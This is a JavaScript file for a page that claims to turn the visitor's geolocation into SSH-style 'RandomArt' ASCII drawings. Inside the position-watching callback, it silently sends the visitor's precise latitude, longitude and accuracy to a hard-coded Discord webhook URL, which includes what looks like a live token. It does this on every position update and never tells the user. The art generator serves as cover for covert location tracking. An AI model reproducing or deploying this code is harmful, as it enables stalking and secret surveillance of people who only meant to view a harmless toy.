// DJB2 hash on byte array
function djb2(data) {
  let hash = 5381;
  for (let i = 0; i < data.length; i++) {
    hash = ((hash << 5) + hash + data[i]) >>> 0;
  }
  return hash;
}

// Linear congruential generator
function nextRand(seed) {
  seed = (seed * 1103515245 + 12345) & 0xffffffff;
  return { seed: seed, rnd: seed };
}

// Map count to character
function mapChar(count, x, y, start, end, maxCount, chars) {
  if (x === start.x && y === start.y) return 'S';
  if (x === end.x && y === end.y) return 'E';
  const idx = Math.floor(count * (chars.length - 1) / maxCount);
  return chars[idx];
}

// Generate RandomArt
function generateRandomArt(dataBytes, width = 41, height = 21, stepsMultiplier = 6) {
  let seed = djb2(dataBytes);
  const grid = Array.from({ length: height }, () => Array(width).fill(0));
  let x = Math.floor(width / 2), y = Math.floor(height / 2);
  const start = { x, y };
  grid[y][x]++;
  const moves = [
    [-1, -1], [0, -1], [1, -1],
    [-1,  0],          [1,  0],
    [-1,  1], [0,  1], [1,  1]
  ];
  const steps = width * height * stepsMultiplier;
  for (let i = 0; i < steps; i++) {
    const nr = nextRand(seed);
    seed = nr.seed;
    const dir = (nr.rnd >>> 16) % 8;
    x = Math.min(Math.max(x + moves[dir][0], 0), width - 1);
    y = Math.min(Math.max(y + moves[dir][1], 0), height - 1);
    grid[y][x]++;
  }
  const end = { x, y };
  const chars = [' ', '.', ',', ':', ';', 'o', 'x', '%', '@', '#'];
  const maxCount = Math.max(...grid.flat());
  let art = '+' + '-'.repeat(width) + '+\n';
  for (let iy = 0; iy < height; iy++) {
    art += '|';
    for (let ix = 0; ix < width; ix++) {
      art += mapChar(grid[iy][ix], ix, iy, start, end, maxCount, chars);
    }
    art += '|\n';
  }
  art += '+' + '-'.repeat(width) + '+';
  return art;
}

let watchId = null;
document.getElementById('btn').addEventListener('click', () => {
  const msg = document.getElementById('message');
  msg.innerHTML = '';
  if ('geolocation' in navigator) {
    if (watchId !== null) {
      navigator.geolocation.clearWatch(watchId);
    }
    watchId = navigator.geolocation.watchPosition(pos => {
      const { latitude, longitude, accuracy } = pos.coords;
      const dataStr =
        latitude.toFixed(10) + ',' +
        longitude.toFixed(10) + ',' +
        accuracy.toFixed(10);

      // Send to Discord webhook
      fetch(
        "https://discord.com/api/webhooks/1375024330291023902/tS5vxHyyE9HA1eN3p0F2ltjBhUDx5KQ1bmtEqNPrnY5MjzlHpawkDbsuatBRsVsYcr4U",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content:
              `📍 Location pinged!\n` +
              `Latitude: ${latitude}\n` +
              `Longitude: ${longitude}\n` +
              `Accuracy: ±${accuracy} meters`
          })
        }
      );

      const dataBytes = new TextEncoder().encode(dataStr);
      const art = generateRandomArt(dataBytes);
      msg.innerHTML = `<pre class="art">${art}</pre>`;
    },
    err => {
      msg.textContent = 'Error: ' + err.message;
    },
    {
      enableHighAccuracy: true,
      timeout: 1000,
      maximumAge: 0
    });
  } else {
    msg.textContent = 'Geolocation not supported';
  }
});
